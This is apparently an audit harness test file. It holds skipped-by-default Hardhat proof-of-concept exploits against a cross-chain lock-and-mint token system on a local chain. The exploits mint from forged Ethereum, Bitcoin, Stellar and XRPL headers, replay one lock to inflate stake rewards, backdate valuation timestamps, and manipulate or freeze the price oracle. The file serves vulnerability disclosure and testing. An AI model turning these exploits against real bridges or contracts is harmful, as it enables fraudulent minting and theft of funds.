// Assumption-gap harness PoCs (rig: assumption-gap). FINDINGS ONLY: these
// tests demonstrate gaps on a LOCAL hardhat chain. They do not fix anything.
// They are SKIPPED by default. To run them on purpose:
//   cd base-contracts && GAP_POC=1 npx hardhat test ../testing-rigs/assumption-gap/poc/assumption_gap_poc.test.cjs
// Each test name carries its FINDING id (see ../gap_table.md and
// ../../findings/assumption_gap.json). A passing test means the gap is real.
const path = require("path");
const crypto = require("crypto");
const { createRequire } = require("module");
const BC = path.resolve(__dirname, "../../../base-contracts");
const req = createRequire(path.join(BC, "package.json"));
const { expect } = req("chai");
const { ethers, network } = req("hardhat");
const { ethLockEvidence, encodeEvidence } = req(path.join(BC, "test/lib/ethProof.cjs"));
const UTXO = req(path.join(BC, "test/fixtures/utxo_local_locks.json"));
const XLM = req(path.join(BC, "test/fixtures/stellar_local_locks.json"));
const XRP = req(path.join(BC, "test/fixtures/xrpl_local_locks.json"));

const run = process.env.GAP_POC ? it : it.skip;
const SCALE = 10n ** 18n;
const DAY = 86400n, DAY7 = 7n * DAY;
const ETH_ID = ethers.solidityPackedKeccak256(["string", "string"], ["Ethereum", "native-ETH"]);
const coder = ethers.AbiCoder.defaultAbiCoder();
const PRICE = 2392n * SCALE;

async function advance(secs) {
  await network.provider.send("evm_increaseTime", [Number(secs)]);
  await network.provider.send("evm_mine", []);
}

// Same deployment shape as base-contracts/test/non_base_finality_trust_model.test.cjs.
async function deploySystem({ ethDevFundOnVerifier } = {}) {
  const [deployer, recipient, other, dest, devFund, stranger] = await ethers.getSigners();
  const T = await ethers.getContractFactory("VinculumFinalisToken");
  const vclm = await T.deploy("Vinculum", "VCLM", 10_000_000_000n * SCALE);
  const chonx = await T.deploy("Chonx", "CHONX", 100_000_000_000n * SCALE);
  const verifier = await (await ethers.getContractFactory("VinculumFinalisVerifier")).deploy(
    await vclm.getAddress(), await chonx.getAddress());
  const stake = await (await ethers.getContractFactory("VinculumFinalisStake")).deploy(
    await vclm.getAddress(), await chonx.getAddress(), await vclm.getAddress(), await verifier.getAddress());
  await vclm.initialize(await verifier.getAddress(), await stake.getAddress());
  await chonx.initialize(await verifier.getAddress(), ethers.ZeroAddress);
  const baseLock = await (await ethers.getContractFactory("BaseCommitmentVaultLock")).deploy(
    "Base", devFund.address, await vclm.getAddress(), await chonx.getAddress(), await vclm.getAddress());
  const baseReader = await (await ethers.getContractFactory("BaseLockRecordVerifier")).deploy(await baseLock.getAddress());
  await verifier.registerChainVerifier("Base", await baseReader.getAddress());
  await verifier.registerAssetPrecision("Base", ETH_ID, "ETH", 18, 2, 0);
  await verifier.configureDevFund("Base", devFund.address);
  const ethLock = await (await ethers.getContractFactory("CommitmentVaultLock")).deploy("Ethereum", devFund.address);
  const ethReader = await (await ethers.getContractFactory("SimpleEthereumLockReader")).deploy(await ethLock.getAddress());
  await verifier.registerChainVerifier("Ethereum", await ethReader.getAddress());
  await verifier.registerAssetPrecision("Ethereum", ETH_ID, "ETH", 18, 2, 0);
  await verifier.configureDevFund("Ethereum", (ethDevFundOnVerifier || devFund).address);
  await verifier.setScheduledPricePoster(deployer.address);
  await verifier.applyScheduledPriceRun(1n, [
    { environmentId: "Base", canonicalAssetId: ETH_ID, priceUsd18: PRICE, success: true },
    { environmentId: "Ethereum", canonicalAssetId: ETH_ID, priceUsd18: PRICE, success: true },
  ]);
  await verifier.finalize();
  return { deployer, recipient, other, dest, devFund, stranger, vclm, chonx, verifier, stake, baseLock, ethLock, ethReader };
}

async function baseLockPkg(c, { valueWei = SCALE / 100n, duration = DAY7 } = {}) {
  const lockId = ethers.hexlify(ethers.randomBytes(32));
  await c.baseLock.connect(c.other).createNativeLock(
    lockId, c.recipient.address, 0, ETH_ID, ethers.ZeroHash, c.dest.address, duration,
    (valueWei * PRICE) / SCALE, { value: valueWei });
  const rec = await c.baseLock.lockRecord(lockId);
  return {
    sourceEnvironmentId: "Base", commitmentVaultLockId: lockId, handshakeAllowanceCount: 3,
    canonicalAssetId: ETH_ID, assetPrecision: 18, assetCustodyClass: 2,
    grossAmountSmallestUnits: rec.gross, actualFeeAmountSmallestUnits: rec.fee,
    principalAmountSmallestUnits: rec.principal, feeAssetId: ETH_ID, devFundDestination: "dev",
    feeTransferEvidence: ethers.id("fee"), valuationTimestamp: rec.createdAt, maturityTimestamp: rec.maturity,
    durationSecs: rec.duration, selectedOutputToken: 0, baseRecipient: c.recipient.address,
    releaseDestination: "release", chonxActivationReceipt: "0x",
    racIdentity: ethers.hexlify(ethers.randomBytes(32)), priceRecord: "0x",
    sourceFinalityProof: "0x",
    lockEventProof: coder.encode(["bytes32", "uint256", "uint256", "uint256", "uint256", "uint256", "uint256"],
      [lockId, rec.gross, rec.fee, rec.principal, rec.duration, rec.createdAt, rec.maturity]),
  };
}

function rlpReplace(rlpHex, index, valueHex) {
  const items = ethers.decodeRlp(rlpHex);
  items[index] = valueHex;
  return ethers.encodeRlp(items);
}

describe("assumption-gap PoCs (skipped unless GAP_POC=1)", function () {
  this.timeout(600000);

  run("FINDING AG-01: EVM reader mints from an Ethereum header that exists on no chain (no settled-history anchor)", async () => {
    const c = await deploySystem();
    const lockId = ethers.hexlify(ethers.randomBytes(32));
    const rc = await (await c.ethLock.connect(c.other).createNativeLock(
      lockId, c.recipient.address, 0, ETH_ID, ethers.ZeroHash, c.dest.address, DAY7, PRICE / 100n,
      { value: SCALE / 100n })).wait();
    const ev = await ethLockEvidence(await c.ethLock.getAddress(), rc.hash, lockId);
    // Forge: overwrite mixHash (field 13) and parentHash (field 0). receiptsRoot
    // and stateRoot are untouched, so the receipt and storage proofs still verify,
    // but the resulting block hash was never produced by any chain (not even
    // this private hardhat chain, chain id 31337, which is claimed as chain id 1).
    let forged = rlpReplace(ev.headerRlp, 13, ethers.hexlify(ethers.randomBytes(32)));
    forged = rlpReplace(forged, 0, ethers.hexlify(ethers.randomBytes(32)));
    const forgedHash = ethers.keccak256(forged);
    expect(forgedHash).to.not.equal(ev.block.hash);
    const onChain = await ethers.provider.send("eth_getBlockByHash", [forgedHash, false]);
    expect(onChain).to.equal(null);
    const rec = await c.ethLock.lockRecord(lockId);
    const p = {
      sourceEnvironmentId: "Ethereum", commitmentVaultLockId: lockId, handshakeAllowanceCount: 3,
      canonicalAssetId: ETH_ID, assetPrecision: 18, assetCustodyClass: 2,
      grossAmountSmallestUnits: rec.gross, actualFeeAmountSmallestUnits: rec.fee,
      principalAmountSmallestUnits: rec.principal, feeAssetId: ETH_ID, devFundDestination: "dev",
      feeTransferEvidence: ethers.id("fee"), valuationTimestamp: rec.createdAt, maturityTimestamp: rec.maturity,
      durationSecs: rec.duration, selectedOutputToken: 0, baseRecipient: c.recipient.address,
      releaseDestination: "release", chonxActivationReceipt: "0x",
      racIdentity: ethers.hexlify(ethers.randomBytes(32)), priceRecord: "0x",
      sourceFinalityProof: coder.encode(["uint256", "bytes32", "uint256"], [1, forgedHash, ev.block.number]),
      lockEventProof: encodeEvidence({ ...ev, headerRlp: forged }),
    };
    await c.verifier.recordFeeAndRac(p);
    await c.verifier.verifyAndMint(p, 0);
    const minted = await c.vclm.balanceOf(c.recipient.address);
    expect(minted).to.be.gt(0n);
    console.log(`      AG-01 minted ${ethers.formatEther(minted)} VCLM from forged header ${forgedHash.slice(0, 10)}...`);
  });

  run("FINDING AG-02: UTXO reader accepts a Bitcoin header with no proof of work and no parent", async () => {
    const S = UTXO.chains.Bitcoin.standard;
    const reader = await (await ethers.getContractFactory("BitcoinLockReader")).deploy(S.devFundScript);
    const PROOF = "tuple(bytes header, bytes coinbaseTx, bytes32[] coinbaseBranch, bytes lockTx, bytes32[] lockBranch, uint256 lockIndex, bytes redeemScript, bytes payload, uint256 durationSecs)";
    const proof = (h) => coder.encode([PROOF], [[h, S.coinbaseTx, S.coinbaseBranch, S.lockTx, S.lockBranch, S.lockIndex, S.redeemScript, S.payload, S.durationSecs]]);
    const dsha = (hex) => crypto.createHash("sha256").update(crypto.createHash("sha256").update(Buffer.from(hex.slice(2), "hex")).digest()).digest();
    const hashOf = (hex) => {
      const d = dsha(hex);
      const be = "0x" + d.toString("hex"), le = "0x" + Buffer.from(d).reverse().toString("hex");
      return { be, le };
    };
    const orig = hashOf(S.header);
    const useLe = orig.le.toLowerCase() === S.blockHash.toLowerCase();
    expect(useLe || orig.be.toLowerCase() === S.blockHash.toLowerCase()).to.equal(true);
    const b = Buffer.from(S.header.slice(2), "hex");
    crypto.randomBytes(32).copy(b, 4);           // prev block hash: random, links to nothing
    b.writeUInt32LE(0x1d00ffff, 72);              // bits: mainnet difficulty-1 target
    b.writeUInt32LE(0x12345678, 76);              // nonce: arbitrary, no work done
    const forged = "0x" + b.toString("hex");
    const h = hashOf(forged);
    const forgedHash = useLe ? h.le : h.be;
    // The hash does not meet the 0x1d00ffff target (top 32 bits would be zero).
    expect(BigInt(useLe ? forgedHash : h.le) >> 224n).to.not.equal(0n);
    const [ok] = await reader.verifyFinality(proof(forged), coder.encode(["bytes32", "uint256"], [forgedHash, S.height]));
    expect(ok).to.equal(true);
    const f = await reader.extractFacts(proof(forged));
    expect(f[0]).to.equal(S.lockId);
    console.log(`      AG-02 Bitcoin header with no work accepted, gross ${f[1]} sats`);
  });

  run("FINDING AG-03a: Stellar reader accepts a ledger header with an arbitrary previous-ledger hash (no SCP quorum)", async () => {
    const L = XLM.week;
    const reader = await (await ethers.getContractFactory("StellarLockReader")).deploy(XLM.networkId, XLM.devFund);
    const PROOF = "tuple(bytes header, bytes resultSet, bytes txXdr, bytes payload, uint256 durationSecs)";
    const b = Buffer.from(L.header.slice(2), "hex");
    crypto.randomBytes(32).copy(b, 4); // previousLedgerHash
    const forged = "0x" + b.toString("hex");
    const forgedHash = "0x" + crypto.createHash("sha256").update(b).digest("hex");
    const pr = coder.encode([PROOF], [{ header: forged, resultSet: L.resultSet, txXdr: L.tx, payload: L.payload, durationSecs: L.durationSecs }]);
    const [ok] = await reader.verifyFinality(pr, coder.encode(["bytes32", "uint256"], [forgedHash, L.ledgerSeq]));
    expect(ok).to.equal(true);
    const f = await reader.extractFacts(pr);
    expect(f[1]).to.equal(BigInt(L.gross));
  });

  run("FINDING AG-03b: XRPL reader accepts a ledger header with an arbitrary parent hash (no validator signatures)", async () => {
    const L = XRP.week;
    const reader = await (await ethers.getContractFactory("XrplLockReader")).deploy(XRP.devFundAccountId);
    const PROOF = "tuple(bytes header, bytes paymentTx, bytes paymentMeta, bytes[] paymentInner, bytes escrowTx, bytes escrowMeta, bytes[] escrowInner, bytes payload, uint256 durationSecs)";
    const b = Buffer.from(L.header.slice(2), "hex");
    crypto.randomBytes(32).copy(b, 12); // parent_hash
    const forged = "0x" + b.toString("hex");
    const forgedHash = "0x" + crypto.createHash("sha512").update(Buffer.concat([Buffer.from("4c575200", "hex"), b])).digest().subarray(0, 32).toString("hex");
    const pr = coder.encode([PROOF], [{ header: forged, paymentTx: L.payment.tx, paymentMeta: L.payment.meta, paymentInner: L.payment.inner,
      escrowTx: L.escrow.tx, escrowMeta: L.escrow.meta, escrowInner: L.escrow.inner, payload: L.payload, durationSecs: L.durationSecs }]);
    const [ok] = await reader.verifyFinality(pr, coder.encode(["bytes32", "uint256"], [forgedHash, L.ledgerIndex]));
    expect(ok).to.equal(true);
    const f = await reader.extractFacts(pr);
    expect(f[1]).to.equal(BigInt(L.gross));
  });

  run("FINDING AG-04: one real Base lock records RAC many times (caller-chosen racIdentity), multiplying stake reward VCLM", async () => {
    const c = await deploySystem();
    const p = await baseLockPkg(c);
    await c.verifier.recordFeeAndRac(p);
    await c.verifier.verifyAndMint(p, 0);
    const epoch = await c.verifier.currentEpoch();
    const one = await c.verifier.epochRewardBasis(epoch);
    const K = 20n;
    for (let i = 1n; i < K; i++) {
      // Same lock, already consumed by verifyAndMint. Only racIdentity changes.
      await c.verifier.connect(c.stranger).recordFeeAndRac({ ...p, racIdentity: ethers.hexlify(ethers.randomBytes(32)) });
    }
    const after = await c.verifier.epochRewardBasis(epoch);
    expect(after).to.equal(one * K);
    console.log(`      AG-04 epochRewardBasis for one lock: ${one} -> ${after} (x${K}); epoch reward VCLM = basis*10`);
  });

  run("FINDING AG-04 (damage): the inflated basis is paid out as newly minted stake reward VCLM", async () => {
    const c = await deploySystem();
    const seed = await baseLockPkg(c);
    await c.verifier.recordFeeAndRac(seed);
    await c.verifier.verifyAndMint(seed, 0);
    const staked = await c.vclm.balanceOf(c.recipient.address);
    await c.vclm.connect(c.recipient).approve(await c.stake.getAddress(), staked);
    const posId = await c.stake.nextPositionId();
    await c.stake.connect(c.recipient).createPosition(0, staked, 120n * DAY);
    await advance(10n * DAY); // epoch 2
    const p = await baseLockPkg(c); // one more real lock
    const K = 50n;
    for (let i = 0n; i < K; i++) {
      await c.verifier.recordFeeAndRac({ ...p, racIdentity: ethers.hexlify(ethers.randomBytes(32)) });
    }
    const e = await c.verifier.currentEpoch();
    const basis = await c.verifier.epochRewardBasis(e);
    await advance(25n * DAY);
    for (let n = 1n; n <= e + 1n; n++) await c.stake.closeEpoch(n);
    for (let n = 1n; n <= e; n++) await c.stake.allocateEpoch(n);
    const before = await c.vclm.balanceOf(c.recipient.address);
    await c.stake.connect(c.recipient).claimPosition(posId, e);
    const claimed = (await c.vclm.balanceOf(c.recipient.address)) - before;
    const honestEpochReward = (basis / K) * 10n;
    expect(claimed).to.be.gt(honestEpochReward * (K - 1n));
    console.log(`      AG-04 one lock, ${K} RAC records: stake reward claimed ${ethers.formatEther(claimed)} VCLM vs about ${ethers.formatEther(honestEpochReward)} VCLM honest for that lock`);
  });

  run("FINDING AG-05: caller-chosen valuationTimestamp = 0 keeps the day-0 emission rate after a year", async () => {
    const c = await deploySystem();
    await advance(400n * DAY);
    // Fresh price run so the binding uses a current price for both locks.
    await c.verifier.applyScheduledPriceRun(2n, [{ environmentId: "Base", canonicalAssetId: ETH_ID, priceUsd18: PRICE, success: true }]);
    const honest = await baseLockPkg(c);
    const cheat = await baseLockPkg(c);
    const r = c.recipient.address;
    await c.verifier.recordFeeAndRac(honest);
    await c.verifier.verifyAndMint(honest, 0);
    const a = await c.vclm.balanceOf(r);
    await c.verifier.recordFeeAndRac(cheat);
    await c.verifier.verifyAndMint({ ...cheat, valuationTimestamp: 0 }, 0);
    const b = (await c.vclm.balanceOf(r)) - a;
    expect(b).to.be.gt(a);
    console.log(`      AG-05 same lock size, day 400: honest ${ethers.formatEther(a)} VCLM, valuationTimestamp=0 ${ethers.formatEther(b)} VCLM`);
  });

  run("FINDING AG-06: price is bound at first Base submission, not at lock creation; a later price run reprices an old lock", async () => {
    const c = await deploySystem();
    const p = await baseLockPkg(c); // created while ETH = $2,392
    await c.verifier.applyScheduledPriceRun(2n, [{ environmentId: "Base", canonicalAssetId: ETH_ID, priceUsd18: PRICE * 10n, success: true }]);
    await c.verifier.recordFeeAndRac(p);
    await c.verifier.verifyAndMint(p, 0);
    const got = await c.vclm.balanceOf(c.recipient.address);
    const c2 = await deploySystem();
    const p2 = await baseLockPkg(c2);
    await c2.verifier.recordFeeAndRac(p2);
    await c2.verifier.verifyAndMint(p2, 0);
    const fair = await c2.vclm.balanceOf(c2.recipient.address);
    expect(got).to.equal(fair * 10n);
    console.log(`      AG-06 lock-time price mint ${ethers.formatEther(fair)} VCLM, later-run price mint ${ethers.formatEther(got)} VCLM`);
  });

  run("FINDING AG-07: the single price poster sets any price with no bound and can freeze all future runs with runId = 2^64-1", async () => {
    const c = await deploySystem();
    await c.verifier.applyScheduledPriceRun(2n ** 64n - 1n, [{ environmentId: "Base", canonicalAssetId: ETH_ID, priceUsd18: PRICE * 1000n, success: true }]);
    await expect(c.verifier.applyScheduledPriceRun(2n ** 64n - 1n, [])).to.be.revertedWith("VF-ORC-001: run id must advance");
    const p = await baseLockPkg(c, { valueWei: SCALE / 1000n });
    await c.verifier.recordFeeAndRac(p);
    await c.verifier.verifyAndMint(p, 0);
    console.log(`      AG-07 a 0.001 ETH (about $2.39) lock minted ${ethers.formatEther(await c.vclm.balanceOf(c.recipient.address))} VCLM at a 1000x price; price runs now frozen`);
  });

  run("FINDING AG-09: Verifier Dev Fund configuration is never compared with the lock's actual fee destination", async () => {
    const [, , , , , stranger] = await ethers.getSigners();
    const c = await deploySystem({ ethDevFundOnVerifier: stranger });
    const lockId = ethers.hexlify(ethers.randomBytes(32));
    const rc = await (await c.ethLock.connect(c.other).createNativeLock(
      lockId, c.recipient.address, 0, ETH_ID, ethers.ZeroHash, c.dest.address, DAY7, PRICE / 100n,
      { value: SCALE / 100n })).wait();
    expect(await c.verifier.devFundDestinations("Ethereum")).to.not.equal(await c.ethLock.devFund());
    const ev = await ethLockEvidence(await c.ethLock.getAddress(), rc.hash, lockId);
    const rec = await c.ethLock.lockRecord(lockId);
    const p = {
      sourceEnvironmentId: "Ethereum", commitmentVaultLockId: lockId, handshakeAllowanceCount: 3,
      canonicalAssetId: ETH_ID, assetPrecision: 18, assetCustodyClass: 2,
      grossAmountSmallestUnits: rec.gross, actualFeeAmountSmallestUnits: rec.fee,
      principalAmountSmallestUnits: rec.principal, feeAssetId: ETH_ID, devFundDestination: "anything",
      feeTransferEvidence: ethers.ZeroHash, valuationTimestamp: rec.createdAt, maturityTimestamp: 0,
      durationSecs: rec.duration, selectedOutputToken: 0, baseRecipient: c.recipient.address,
      releaseDestination: "release", chonxActivationReceipt: "0x",
      racIdentity: ethers.hexlify(ethers.randomBytes(32)), priceRecord: "0x",
      sourceFinalityProof: coder.encode(["uint256", "bytes32", "uint256"], [1, ev.block.hash, ev.block.number]),
      lockEventProof: encodeEvidence(ev),
    };
    await c.verifier.recordFeeAndRac(p);
    await c.verifier.verifyAndMint(p, 0);
    expect(await c.vclm.balanceOf(c.recipient.address)).to.be.gt(0n);
  });
});
